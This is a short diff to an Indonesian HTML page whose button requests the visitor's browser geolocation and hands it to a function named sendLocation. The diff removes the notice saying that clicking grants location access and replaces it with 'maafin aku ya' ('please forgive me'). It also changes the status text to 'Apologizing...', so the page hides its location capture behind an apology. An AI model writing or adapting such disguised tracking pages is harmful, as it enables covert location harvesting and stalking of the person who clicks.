@@ -53,7 +53,7 @@ button:hover {
 <button onclick="getLocation()">Klik Aku</button>
 
 <p style="font-size:12px; margin-top:15px;">
-Dengan klik tombol ini kamu mengizinkan akses lokasi.
+maafin aku ya.
 </p>
 
 <div id="status"></div>
@@ -61,7 +61,7 @@ Dengan klik tombol ini kamu mengizinkan akses lokasi.
 <script>
 function getLocation() {
     const status = document.getElementById("status");
-    status.innerHTML = "Meminta izin lokasi...";
+    status.innerHTML = "Meminta maaf...";
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, showError);
